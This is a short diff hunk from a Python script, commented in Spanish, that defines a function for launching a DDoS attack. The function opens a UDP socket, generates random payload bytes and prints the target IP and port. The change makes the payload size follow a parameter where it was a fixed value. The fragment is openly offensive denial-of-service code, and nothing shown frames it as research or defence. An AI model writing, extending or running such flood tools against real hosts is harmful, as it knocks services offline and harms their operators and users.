@@ -8,7 +8,7 @@ from tqdm import tqdm
 # Función para iniciar el ataque DDoS
 def iniciar_ataque(ip_target, port, total_paquetes):
     udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    udp_bytes = random._urandom(14900000)
+    udp_bytes = random._urandom(int(total_paquetes))
 
     print("\nIniciando ataque DDoS...")
     print(f"Objetivo: {ip_target}:{port}")
